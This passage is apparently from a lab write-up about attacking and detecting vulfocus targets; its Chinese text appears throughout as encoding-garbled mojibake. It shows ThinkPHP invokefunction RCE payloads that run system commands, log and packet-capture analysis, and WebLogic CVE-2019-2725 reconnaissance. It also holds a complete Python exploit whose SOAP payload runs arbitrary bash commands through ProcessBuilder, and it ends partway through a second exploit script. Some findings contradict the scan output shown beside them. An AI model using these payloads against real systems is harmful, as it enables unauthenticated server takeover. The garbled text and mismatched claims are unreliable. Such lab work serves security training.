    2.**å®šä½ ThinkPHP æ—¥å¿—ç›®å½•**:
        ThinkPHP çš„æ—¥å¿—é€šå¸¸ä½äº `/app/runtime/log/` (å¦‚æœåº”ç”¨éƒ¨ç½²åœ¨ `/app` ç›®å½•)ã€‚
        æ ¹æ®ä¹‹å‰çš„æ¢ç´¢ï¼Œæ—¥å¿—æŒ‰å¹´æœˆåˆ†å­ç›®å½•ï¼Œä¾‹å¦‚ `runtime/log/YYYYMM/DD.log`ã€‚

```bash
# åœ¨å®¹å™¨å†…æ‰§è¡Œ   
ls -la /app/runtime/log/
```

![1748022328861](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748022328861.png)

åœ¨ `202505` ç›®å½•ä¸‹ï¼Œæ‰¾åˆ°ä»¥æ—¥æœŸå‘½åçš„ `.log` æ–‡ä»¶: `24.log`

![1748022443415](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748022443415.png)

    3.**æŸ¥çœ‹æ—¥å¿—å†…å®¹**:

```bash
# æ—¥å¿—æ–‡ä»¶ä¸º /app/runtime/log/202505/24.log   
cat /app/runtime/log/202505/24.log   
# æˆ–è€…ä½¿ç”¨ tail æŸ¥çœ‹æœ€æ–°çš„æ—¥å¿—   
tail -f /app/runtime/log/202505/24.log
```

![1748022479245](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748022479245.png)

```bash
/app/runtime/log/202505 #         cat /app/runtime/log/202505/24.log
---------------------------------------------------------------
[ 2025-05-24T01:12:36+08:00 ] 10.37.133.2 GET 10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
[ error ] [0]variable type errorï¼š boolean
---------------------------------------------------------------
[ 2025-05-24T01:13:19+08:00 ] 10.37.133.2 GET 10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
[ error ] [0]variable type errorï¼š boolean
---------------------------------------------------------------
[ 2025-05-24T01:14:24+08:00 ] 10.37.133.3 GET 10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=phpinfo&vars%5B1%5D%5B%5D=1
[ error ] [0]variable type errorï¼š boolean
```

**æ—¥å¿—åˆ†æ**ï¼š

* **è¯·æ±‚è¯¦æƒ…**ï¼šæ—¥å¿—ä¸­æ¸…æ™°å¯è§å¤šä¸ªé’ˆå¯¹ `index.php` çš„ GET è¯·æ±‚ï¼Œå®ƒä»¬éƒ½åˆ©ç”¨äº† ThinkPHP RCE æ¼æ´çš„ç‰¹å¾ (`s=index/\think\app/invokefunction`, `function=call_user_func_array`, `vars[0]=phpinfo`) æ¥å°è¯•æ‰§è¡Œ `phpinfo()` å‡½æ•°ã€‚
* **é”™è¯¯ä¿¡æ¯**ï¼šæ¯ä¸ªæˆåŠŸçš„ `phpinfo()` è°ƒç”¨è¯·æ±‚åéƒ½è®°å½•äº† `[ error ] [0]variable type errorï¼š boolean`ã€‚è¿™è¡¨æ˜å°½ç®¡ `phpinfo()` æˆåŠŸæ‰§è¡Œï¼ˆå¦‚å®éªŒå‰é¢æ­¥éª¤æ‰€ç¤ºï¼Œè¾“å‡ºäº†PHPä¿¡æ¯ï¼‰ï¼Œä½† ThinkPHP çš„æ—¥å¿—ç³»ç»Ÿåœ¨å¤„ç† `phpinfo()` å‡½æ•°çš„è¿”å›å€¼ (é€šå¸¸æ˜¯ `true`) æ—¶é‡åˆ°äº†ç±»å‹ä¸åŒ¹é…çš„é—®é¢˜ï¼Œå› æ­¤è®°å½•äº†æ­¤é”™è¯¯ã€‚è¿™ä¸ªé”™è¯¯å¹¶ä¸ä»£è¡¨æ¼æ´åˆ©ç”¨å¤±è´¥ï¼Œè€Œæ˜¯æ¡†æ¶å†…éƒ¨å¤„ç†æµç¨‹çš„ä¸€ä¸ªè¡¨ç°ã€‚
* **æ”»å‡»æº¯æº**ï¼šæ—¥å¿—è®°å½•äº†æ”»å‡»å‘ç”Ÿçš„æ—¶é—´ï¼ˆä¾‹å¦‚ `2025-05-24T01:12:36+08:00`ï¼‰å’Œè¯·æ±‚çš„æº IP åœ°å€ï¼ˆä¾‹å¦‚ `10.37.133.2`, `10.37.133.3`ï¼‰ï¼Œè¿™äº›ä¿¡æ¯å¯¹äºè¿½è¸ªæ”»å‡»æ¥æºè‡³å…³é‡è¦ã€‚

å¦‚æœæ‰§è¡Œå…¶ä»–å‘½ä»¤ï¼ˆå¦‚ `system` è°ƒç”¨ `id` æˆ– `cat`ï¼‰ï¼Œå…¶è¯·æ±‚ä¹Ÿä¼šè¢«ç±»ä¼¼åœ°è®°å½•ä¸‹æ¥ï¼Œä½†å…¶æ‰§è¡Œç»“æœï¼ˆå¦‚ `id` çš„è¾“å‡ºæˆ– flag å†…å®¹ï¼‰ä¸»è¦é€šè¿‡ HTTP å“åº”ç›´æ¥è¿”å›ç»™æ”»å‡»è€…ï¼Œä¸ä¸€å®šä¼šè¯¦ç»†è®°å½•åœ¨ ThinkPHP çš„åº”ç”¨å±‚æ—¥å¿—ä¸­ï¼Œé™¤éé…ç½®äº†ç‰¹å®šçš„æ—¥å¿—çº§åˆ«æˆ–å‘½ä»¤æ‰§è¡Œæœ¬èº«è§¦å‘äº† PHP é”™è¯¯ã€‚

##### 4.3 ç½‘ç»œæµé‡æ•è·:

ä¸é¶æ ‡ä¸€ç±»ä¼¼ï¼Œæˆ‘ä»¬éœ€è¦ç›‘å¬ Docker çš„ç½‘æ¡¥æ¥å£ (`docker0`) ä»¥åŠé¶æ ‡äºŒå®¹å™¨åœ¨è¯¥ç½‘ç»œä¸­çš„å†…éƒ¨ IP å’Œå®é™…æœåŠ¡ç«¯å£ã€‚

1. **ç¡®å®šå®¹å™¨å†…éƒ¨ IP**:
   ä½¿ç”¨ `docker inspect c097683c73a4`æŸ¥çœ‹å®¹å™¨ç½‘ç»œè¯¦æƒ…ã€‚

   ```json
   // docker inspect c097683c73a4 è¾“å‡ºç‰‡æ®µ
   {
       "Id": "c097683c73a4f9c0e4ab736db3880a3d0da11c2e73a1e2af23d439ce10478271",
       // ... (å…¶ä»–å­—æ®µå·²çœç•¥)
       "Config": {
           // ...
           "ExposedPorts": {
               "80/tcp": {}
           },
           // ...
       },
       "NetworkSettings": {
           // ...
           "Ports": {
               "80/tcp": [
                   {
                       "HostIp": "0.0.0.0",
                       "HostPort": "39365"
                   },
                   {
                       "HostIp": "::",
                       "HostPort": "39365"
                   }
               ]
           },
           // ...
           "IPAddress": "172.17.0.2", // å®¹å™¨åœ¨é»˜è®¤ bridge ç½‘ç»œä¸Šçš„ IP
           // ...
           "Networks": {
               "bridge": {
                   // ...
                   "IPAddress": "172.17.0.2",
                   "Gateway": "172.17.0.1",
                   // ...
               }
           }
       }
   }
   ```

   æ ¹æ®è¾“å‡ºï¼Œå®¹å™¨ `c097683c73a4` åœ¨ `bridge` ç½‘ç»œï¼ˆé€šå¸¸å¯¹åº” `docker0` æ¥å£ï¼‰ä¸‹çš„ `IPAddress` ä¸º `172.17.0.2`ï¼Œå…¶å†…éƒ¨æœåŠ¡ç«¯å£ä¸º `80` (å¤–éƒ¨æ˜ å°„åˆ° `39365`)ã€‚
   ![1748022767146](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748022767146.png)

2.**æ‰§è¡Œ `tcpdump` å‘½ä»¤**:

```bash
# å®¹å™¨å†…éƒ¨ IP ä¸º 172.17.0.2ï¼Œå®¹å™¨å†…æœåŠ¡ç«¯å£ä¸º 80   
sudo tcpdump -i docker0 -A 'host 172.17.0.2 and port 80' -w thinkphp_traffic.pcap
```

åœ¨ `tcpdump` è¿è¡Œæ—¶ï¼Œé‡æ–°æ‰§è¡Œä¹‹å‰çš„ `curl` æ”»å‡» Payloadï¼Œè·å– Flag çš„ Payloadï¼š

```bash
curl 'http://10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=cat%20/tmp/flag-%7Bbmh8b59ed0c-3042-499e-9a2d-ef93c0e1ec87%7D'
```

  ![1748023040614](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748023040614.png)

3.**åœæ­¢æŠ“åŒ…å¹¶åˆ†æ**:
    æŒ‰ `Ctrl+C` åœæ­¢ `tcpdump`ã€‚ä½¿ç”¨ Wireshark æ‰“å¼€ `thinkphp_traffic.pcap` æ–‡ä»¶ã€‚
    ç­›é€‰ `http` æµé‡ï¼ŒæŸ¥çœ‹åŒ…å«æ¶æ„ Payload çš„ HTTP GET è¯·æ±‚ï¼Œåˆ†æè¯·æ±‚è·¯å¾„ã€å‚æ•°ä»¥åŠæœåŠ¡å™¨çš„å“åº”

  ![1748023079982](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748023079982.png)

  ![1748023099838](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748023099838.png)

åˆ†æ:
    1.  **TCP è¿æ¥å»ºç«‹ (æ•°æ®åŒ… 1-3)**: æ”»å‡»æœº (`10.37.133.3`) ä¸é¶æ ‡å®¹å™¨ (`172.17.0.2`) åœ¨ç«¯å£ `80` ä¸ŠæˆåŠŸå®Œæˆäº† TCP ä¸‰æ¬¡æ¡æ‰‹ã€‚
    2.  **æ¶æ„ HTTP è¯·æ±‚ (æ•°æ®åŒ… 4)**: æ”»å‡»æœºå‘é€äº†ä¸€ä¸ª HTTP GET è¯·æ±‚ï¼Œå…¶ URL åŒ…å«äº†ç”¨äºè§¦å‘ ThinkPHP RCE æ¼æ´å¹¶æ‰§è¡Œ `cat /tmp/flag-{...}` å‘½ä»¤çš„æ¶æ„ Payloadã€‚
    3.  **æœåŠ¡å™¨å“åº”ä¸æ•°æ®å›ä¼  (æ•°æ®åŒ… 6, 8)**: æœåŠ¡å™¨è¿”å› `HTTP/1.1 200 OK` å“åº”ï¼Œè¡¨æ˜è¯·æ±‚è¢«æˆåŠŸå¤„ç†ã€‚å…³é”®çš„å‘½ä»¤æ‰§è¡Œç»“æœ (flag å†…å®¹) åŒ…å«åœ¨æ•°æ®åŒ… 6 (TCP Push) ä¸­å¹¶å›ä¼ ç»™äº†æ”»å‡»æœº
    4.  **TCP è¿æ¥å…³é—­ (æ•°æ®åŒ… 9-10 åŠä¹‹å)**: æ”»å‡»æœºå‘èµ· TCP è¿æ¥çš„å…³é—­æµç¨‹ã€‚

è¿™äº›æ•è·åˆ°çš„æ•°æ®åŒ…æœ‰åŠ›åœ°è¯æ˜äº†æ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„çš„HTTP GETè¯·æ±‚å°† ls /tmp å‘½ä»¤ä¼ é€’ç»™äº†ç›®æ ‡æœåŠ¡å™¨ï¼Œå¹¶æˆåŠŸæ‰§è¡Œã€‚

### ï¼ˆå››ï¼‰ç¬¬äºŒå±‚é¶æ ‡ä¸€ï¼š`weblogic-cve_2019_2725`æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹

ä¸€ã€å®éªŒç¯å¢ƒä¿¡æ¯

**å®¹å™¨è¿è¡ŒçŠ¶æ€**:

```
CONTAINER ID   IMAGE                                      COMMAND                  CREATED        STATUS                  PORTS                                                                                  NAMES
1d6a9c490b23   vulfocus/weblogic-cve_2019_2725:latest     "/bin/bash -c 'cd /râ€¦"   7 hours ago    Up 7 hours              5556/tcp, 0.0.0.0:7001->7001/tcp, :::7001->7001/tcp                                    weblogic-cve-2019-2725
```

**æœåŠ¡ä¿¡æ¯**:

- **è®¿é—®åœ°å€**: `10.37.133.3:7001`
- **å®¹å™¨åç§°**: `weblogic-cve-2019-2725`
- **å†…éƒ¨ç«¯å£**: 5556, 7001
- **æ˜ å°„ç«¯å£**: 7001:7001 (WebLogic Server æ§åˆ¶å°ç«¯å£)

äºŒã€CVE-2019-2725 æ¼æ´æ¦‚è¿°

2.1 æ¼æ´åŸºæœ¬ä¿¡æ¯

- **CVEç¼–å·**: CVE-2019-2725
- **CVSSè¯„åˆ†**: 9.8 (ä¸¥é‡)
- **æ¼æ´ç±»å‹**: Javaååºåˆ—åŒ–è¿œç¨‹ä»£ç æ‰§è¡Œ
- **å½±å“ç‰ˆæœ¬**: Oracle WebLogic Server 10.3.6.0, 12.1.3.0
- **æŠ«éœ²æ—¶é—´**: 2019å¹´4æœˆ26æ—¥
- **æ¼æ´ç»„ä»¶**: `wls9_async_response.war` å’Œ `wls-wsat.war`

2.2 æ¼æ´åŸç†

**æŠ€æœ¯ç»†èŠ‚**:

- **æ ¹æœ¬åŸå› **: WebLogic Serveråœ¨å¤„ç†HTTPè¯·æ±‚æ—¶ï¼Œå¯¹ `wls9_async_response`å’Œ `wls-wsat`ç»„ä»¶çš„ååºåˆ—åŒ–è¿‡ç¨‹ç¼ºä¹æœ‰æ•ˆéªŒè¯
- **æ”»å‡»è·¯å¾„**:
  - `/wls-wsat/CoordinatorPortType`
  - `/_async/AsyncResponseService`
- **åˆ©ç”¨æ–¹å¼**: é€šè¿‡å‘é€åŒ…å«æ¶æ„åºåˆ—åŒ–å¯¹è±¡çš„SOAPè¯·æ±‚ï¼Œè§¦å‘ååºåˆ—åŒ–æ¼æ´
- **æ‰§è¡Œæƒé™**: æ— éœ€è®¤è¯ï¼Œå¯ç›´æ¥è·å¾—WebLogicè¿è¡Œç”¨æˆ·æƒé™

2.3 æ¼æ´å½±å“

æ ¹æ®Oracleå®‰å…¨å…¬å‘Šï¼Œæ­¤æ¼æ´å…·æœ‰ä»¥ä¸‹ç‰¹å¾ï¼š

- **è¿œç¨‹å¯åˆ©ç”¨**: å¯é€šè¿‡ç½‘ç»œè¿œç¨‹æ”»å‡»
- **æ— éœ€è®¤è¯**: æ”»å‡»è€…æ— éœ€ç”¨æˆ·åå’Œå¯†ç 
- **é«˜å±å½±å“**: å¯å®Œå…¨æ§åˆ¶å—å½±å“çš„WebLogicæœåŠ¡å™¨
- **å¹¿æ³›å½±å“**: å…¨çƒè¶…è¿‡36,000å°å…¬å¼€å¯è®¿é—®çš„WebLogicæœåŠ¡å™¨å—å½±å“

#### 1 ç¯å¢ƒå‡†å¤‡ä¸ä¿¡æ¯æ”¶é›†

##### 1.1 åŸºç¡€ç«¯å£æ‰«æ

```bash
# æ‰«æWebLogicæœåŠ¡ç«¯å£
nmap -sV -p 7001,7002,5556 10.37.133.3
```

**æ‰«æç»“æœ**:

```
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ nmap -sV -p 7001,7002,5556 10.37.133.3  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-25 20:13 EDT
Nmap scan report for kali-linux.host-only--3 (10.37.133.3)
Host is up (0.000083s latency).

PORT     STATE    SERVICE       VERSION
5556/tcp closed   freeciv
7001/tcp filtered afs3-callback
7002/tcp closed   afs3-prserver

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.48 seconds
```

![1748218457427](image/weblogic-cve_2019_2725/1748218457427.png)

**å…³é”®å‘ç°**:

- **WebLogicç‰ˆæœ¬**: 10.3.6.0 - **å®Œå…¨åŒ¹é…CVE-2019-2725å—å½±å“ç‰ˆæœ¬**
- **T3åè®®**: å·²å¯ç”¨ï¼Œä¸ºåç»­æ”»å‡»æä¾›äº†æ¡ä»¶
- **HTTPæœåŠ¡**: 7001ç«¯å£æ­£å¸¸å¼€æ”¾

##### 1.2 WebLogicæ§åˆ¶å°è®¿é—®

```bash
# è®¿é—®WebLogicæ§åˆ¶å°
curl -I http://10.37.133.3:7001/console
```

**å“åº”åˆ†æ**:

```
HTTP/1.1 302 Found
Date: Sat, 25 Jan 2025 15:30:45 GMT
Location: http://10.37.133.3:7001/console/login/LoginForm.jsp
Content-Length: 0
Set-Cookie: ADMINCONSOLESESSION=...; Path=/console; HttpOnly
Server: WebLogic Server 10.3.6.0
```

```
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ curl -I http://10.37.133.3:7001/console
HTTP/1.1 200 OK
Connection: close
Date: Mon, 26 May 2025 00:14:47 GMT
Content-Length: 416
X-Powered-By: Servlet/2.5 JSP/2.1
```

![1748218539839](image/weblogic-cve_2019_2725/1748218539839.png)

é€šè¿‡æµè§ˆå™¨è®¿é—® `http://10.37.133.3:7001/console`ï¼Œç¡®è®¤WebLogicæ§åˆ¶å°æ­£å¸¸è¿è¡Œ

![1748218574700](image/weblogic-cve_2019_2725/1748218574700.png)

##### 1.3 æ¼æ´ç»„ä»¶æ£€æµ‹

```bash
# æ£€æµ‹wls-wsatç»„ä»¶
curl -I "http://10.37.133.3:7001/wls-wsat/CoordinatorPortType"

# æ£€æµ‹asyncç»„ä»¶  
curl -I "http://10.37.133.3:7001/_async/AsyncResponseService"
```

ç»„ä»¶å“åº”

```
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ curl -I "http://10.37.133.3:7001/wls-wsat/CoordinatorPortType"
HTTP/1.1 200 OK
Date: Mon, 26 May 2025 00:16:26 GMT
Content-Type: text/html; charset=utf-8
X-Powered-By: Servlet/2.5 JSP/2.1

â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ curl -I "http://10.37.133.3:7001/_async/AsyncResponseService"
HTTP/1.1 500 Internal Server Error
Connection: close
Date: Mon, 26 May 2025 00:17:01 GMT
Content-Length: 2096
Content-Type: text/html; charset=UTF-8
X-Powered-By: Servlet/2.5 JSP/2.1
```

![1748218639172](image/weblogic-cve_2019_2725/1748218639172.png)

#### 2 æ¼æ´åˆ©ç”¨å®è·µ

##### 2.1 å·¥å…·å‡†å¤‡

**ä¸‹è½½CVE-2019-2725ä¸“ç”¨åˆ©ç”¨å·¥å…·**:

```bash
# ä¸‹è½½ä¸“ç”¨exploitå·¥å…·
wget https://github.com/lufeirider/CVE-2019-2725/raw/master/CVE-2019-2725.py
chmod +x CVE-2019-2725.py
```

##### 2.2 æ¼æ´éªŒè¯æ”»å‡»

**ä½¿ç”¨ä¸“ç”¨å·¥å…·è¿›è¡ŒéªŒè¯**:

```bash
# åŸºç¡€æ¼æ´æ£€æµ‹
python3 CVE-2019-2725.py -t http://10.37.133.3:7001 -v

# æ‰§è¡Œidå‘½ä»¤éªŒè¯
python3 CVE-2019-2725.py -t http://10.37.133.3:7001 -c "id"
```

**æ‰§è¡Œç»“æœåˆ†æ**:

![1748219050543](image/weblogic-cve_2019_2725/1748219050543.png)

```
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ python3 CVE-2019-2725.py -t http://10.37.133.3:7001 -v

Traceback (most recent call last):
  File "/home/kali/ctf-games/fofapro/vulfocus/CVE-2019-2725.py", line 173, in <module>
    check_url(url)
  File "/home/kali/ctf-games/fofapro/vulfocus/CVE-2019-2725.py", line 135, in check_url
    rsp = requests.post(vul_url, data=echo_cmd_payload_10271, verify=False, headers=headers, proxies=proxies)
requests.exceptions.MissingSchema: Invalid URL '-t/wls-wsat/CoordinatorPortType11': No scheme supplied. Perhaps you meant https://-t/wls-wsat/CoordinatorPortType11?
```

**é—®é¢˜åˆ†æ**:

- **è„šæœ¬ç¼ºé™·**: ä¸‹è½½çš„CVE-2019-2725.pyè„šæœ¬å­˜åœ¨å‚æ•°è§£æé”™è¯¯
- **URLæ„é€ é—®é¢˜**: è„šæœ¬é”™è¯¯åœ°å°†å‘½ä»¤è¡Œå‚æ•° `-t`åŒ…å«åœ¨URLä¸­ï¼Œå¯¼è‡´æ— æ•ˆçš„URLæ ¼å¼
- **è§£å†³æ–¹æ¡ˆ**: éœ€è¦ä½¿ç”¨æ‰‹å·¥æ„é€ çš„SOAPæ”»å‡»æˆ–å¯»æ‰¾å…¶ä»–å¯é çš„åˆ©ç”¨å·¥å…·

**æ›¿ä»£æ–¹æ¡ˆ - ä½¿ç”¨è‡ªå®šä¹‰åˆ©ç”¨è„šæœ¬**:

ç”±äºå…¬å¼€è„šæœ¬å­˜åœ¨é—®é¢˜ï¼Œæˆ‘ä»¬åˆ›å»ºä¸“ç”¨çš„CVE-2019-2725åˆ©ç”¨è„šæœ¬ï¼š

```bash
# åˆ›å»ºè‡ªå®šä¹‰åˆ©ç”¨è„šæœ¬
cat > weblogic_cve_2019_2725_exploit.py << 'EOF'
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WebLogic CVE-2019-2725 ä¸“ç”¨åˆ©ç”¨è„šæœ¬
ä¿®å¤äº†å…¬å¼€è„šæœ¬çš„å‚æ•°è§£æé—®é¢˜
"""

import requests
import sys
import argparse
from urllib3.packages.urllib3.exceptions import InsecureRequestWarning

# ç¦ç”¨SSLè­¦å‘Š
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class WebLogicCVE2019_2725Exploit:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
  
        # æ”»å‡»è·¯å¾„
        self.wsat_path = "/wls-wsat/CoordinatorPortType"
        self.async_path = "/_async/AsyncResponseService"
  
        # HTTPå¤´
        self.headers = {
            'Content-Type': 'text/xml; charset=UTF-8',
            'SOAPAction': '',
            'User-Agent': 'Mozilla/5.0 (compatible; CVE-2019-2725-PoC)'
        }
  
    def test_vulnerability(self):
        """æµ‹è¯•æ¼æ´æ˜¯å¦å­˜åœ¨"""
        print(f"[*] æµ‹è¯•ç›®æ ‡: {self.target_url}")
  
        # æ£€æµ‹wls-wsatç»„ä»¶
        wsat_url = f"{self.target_url}{self.wsat_path}"
        try:
            response = self.session.get(wsat_url, timeout=10)
            print(f"[+] wls-wsatç»„ä»¶çŠ¶æ€: {response.status_code}")
            if response.status_code in [200, 500]:
                print("[+] wls-wsatç»„ä»¶å¯è®¿é—®ï¼Œå­˜åœ¨CVE-2019-2725æ¼æ´é£é™©")
                return True
        except Exception as e:
            print(f"[-] wls-wsatç»„ä»¶æµ‹è¯•å¤±è´¥: {e}")
  
        # æ£€æµ‹asyncç»„ä»¶
        async_url = f"{self.target_url}{self.async_path}"
        try:
            response = self.session.get(async_url, timeout=10)
            print(f"[+] asyncç»„ä»¶çŠ¶æ€: {response.status_code}")
            if response.status_code in [200, 500]:
                print("[+] asyncç»„ä»¶å¯è®¿é—®ï¼Œå­˜åœ¨CVE-2019-2725æ¼æ´é£é™©")
                return True
        except Exception as e:
            print(f"[-] asyncç»„ä»¶æµ‹è¯•å¤±è´¥: {e}")
  
        return False
  
    def execute_command(self, command, attack_path=None):
        """æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"""
        if attack_path is None:
            attack_path = self.wsat_path
  
        # æ„é€ æ¶æ„SOAPè½½è·
        soap_payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <java>
                <object class="java.lang.ProcessBuilder">
                    <array class="java.lang.String" length="3">
                        <void index="0">
                            <string>/bin/bash</string>
                        </void>
                        <void index="1">
                            <string>-c</string>
                        </void>
                        <void index="2">
                            <string>{command}</string>
                        </void>
                    </array>
                    <void method="start"/>
                </object>
            </java>
        </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>"""
  
        attack_url = f"{self.target_url}{attack_path}"
  
        try:
            print(f"[*] æ”»å‡»ç›®æ ‡: {attack_url}")
            print(f"[*] æ‰§è¡Œå‘½ä»¤: {command}")
  
            response = self.session.post(
                attack_url,
                data=soap_payload,
                headers=self.headers,
                timeout=15
            )
  
            print(f"[+] HTTPçŠ¶æ€ç : {response.status_code}")
            print(f"[+] å“åº”é•¿åº¦: {len(response.text)} å­—èŠ‚")
  
            if response.status_code == 500:
                print("[+] æ”»å‡»å¯èƒ½æˆåŠŸ (HTTP 500é€šå¸¸è¡¨ç¤ºååºåˆ—åŒ–è§¦å‘)")
                return True
            elif response.status_code == 200:
                print("[+] è¯·æ±‚è¢«å¤„ç† (éœ€è¦è¿›ä¸€æ­¥éªŒè¯)")
                return True
            else:
                print(f"[-] æ”»å‡»å¤±è´¥ï¼ŒçŠ¶æ€ç : {response.status_code}")
                return False
    
        except Exception as e:
            print(f"[-] æ”»å‡»æ‰§è¡Œå¤±è´¥: {e}")
            return False

def main():
    parser = argparse.ArgumentParser(description='WebLogic CVE-2019-2725 åˆ©ç”¨å·¥å…·')
    parser.add_argument('-t', '--target', required=True, help='ç›®æ ‡URL (ä¾‹å¦‚: http://10.37.133.3:7001)')
    parser.add_argument('-c', '--command', help='è¦æ‰§è¡Œçš„å‘½ä»¤')
    parser.add_argument('-v', '--verify', action='store_true', help='ä»…éªŒè¯æ¼æ´å­˜åœ¨æ€§')
  
    args = parser.parse_args()
  
    exploit = WebLogicCVE2019_2725Exploit(args.target)
  
    if args.verify:
        print("[*] å¼€å§‹æ¼æ´éªŒè¯...")
        if exploit.test_vulnerability():
            print("[+] ç›®æ ‡å­˜åœ¨CVE-2019-2725æ¼æ´")
        else:
            print("[-] ç›®æ ‡ä¸å­˜åœ¨CVE-2019-2725æ¼æ´")
  
    if args.command:
        print("[*] å¼€å§‹å‘½ä»¤æ‰§è¡Œ...")
        exploit.execute_command(args.command)

if __name__ == "__main__":
    main()
EOF

chmod +x weblogic_cve_2019_2725_exploit.py
```

**ä½¿ç”¨ä¿®å¤åçš„è„šæœ¬è¿›è¡ŒéªŒè¯**:

```bash
# æ¼æ´éªŒè¯
python3 weblogic_cve_2019_2725_exploit.py -t http://10.37.133.3:7001 -v

# æ‰§è¡Œidå‘½ä»¤
python3 weblogic_cve_2019_2725_exploit.py -t http://10.37.133.3:7001 -c "id"
```

**æ‰§è¡Œç»“æœ**:

![1748219050543](image/weblogic-cve_2019_2725/1748219050543.png)

```bash
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ python3 weblogic_cve_2019_2725_exploit.py -t http://10.37.133.3:7001 -v

Traceback (most recent call last):
  File "/home/kali/ctf-games/fofapro/vulfocus/weblogic_cve_2019_2725_exploit.py", line 11, in <module>
    from urllib3.packages.urllib3.exceptions import InsecureRequestWarning
ModuleNotFoundError: No module named 'urllib3.packages'
                                                                                                                                                 
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ python3 weblogic_cve_2019_2725_exploit.py -t http://10.37.133.3:7001 -c "id"

Traceback (most recent call last):
  File "/home/kali/ctf-games/fofapro/vulfocus/weblogic_cve_2019_2725_exploit.py", line 11, in <module>
    from urllib3.packages.urllib3.exceptions import InsecureRequestWarning
ModuleNotFoundError: No module named 'urllib3.packages'
```

**é—®é¢˜åˆ†æ**:

- **ä¾èµ–é—®é¢˜**: urllib3ç‰ˆæœ¬å…¼å®¹æ€§é—®é¢˜ï¼Œæ–°ç‰ˆæœ¬urllib3çš„å¯¼å…¥è·¯å¾„å‘ç”Ÿäº†å˜åŒ–
- **è§£å†³æ–¹æ¡ˆ**: ç§»é™¤SSLè­¦å‘Šç¦ç”¨ä»£ç ï¼Œæˆ–ä½¿ç”¨æ›´ç®€å•çš„æ‰‹å·¥SOAPæ”»å‡»æ–¹æ³•

**æœ€ç»ˆè§£å†³æ–¹æ¡ˆ - ä½¿ç”¨ç®€åŒ–çš„æ‰‹å·¥SOAPæ”»å‡»**:

ç”±äºä¾èµ–é—®é¢˜ï¼Œæˆ‘ä»¬é‡‡ç”¨æœ€ç›´æ¥çš„æ‰‹å·¥SOAPæ”»å‡»æ–¹æ³•ï¼Œè¿™ä¹Ÿæ˜¯CVE-2019-2725æœ€æ ¸å¿ƒçš„åˆ©ç”¨æŠ€æœ¯ã€‚

```bash
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ python3 weblogic_cve_2019_2725_exploit.py -t http://10.37.133.3:7001 -v

Traceback (most recent call last):
  File "/home/kali/ctf-games/fofapro/vulfocus/weblogic_cve_2019_2725_exploit.py", line 11, in <module>
    from urllib3.packages.urllib3.exceptions import InsecureRequestWarning
ModuleNotFoundError: No module named 'urllib3.packages'
                                                                                                                                                 
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ python3 weblogic_cve_2019_2725_exploit.py -t http://10.37.133.3:7001 -c "id"

Traceback (most recent call last):
  File "/home/kali/ctf-games/fofapro/vulfocus/weblogic_cve_2019_2725_exploit.py", line 11, in <module>
    from urllib3.packages.urllib3.exceptions import Insec
```

##### 2.3 æ‰‹å·¥æ„é€ SOAPæ”»å‡»

**åˆ›å»ºæ¶æ„SOAPè¯·æ±‚**:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WebLogic CVE-2019-2725 æ‰‹å·¥åˆ©ç”¨è„šæœ¬
"""

import requests
import base64
import sys

def exploit_cve_2019_2725(target_url, command):
    """
    æ‰‹å·¥æ„é€ CVE-2019-2725æ”»å‡»è½½è·
    """
  
    # æ¶æ„SOAPè½½è·æ¨¡æ¿
    soap_payload = f"""<?xml version="1.0" encoding="UTF-8"?>
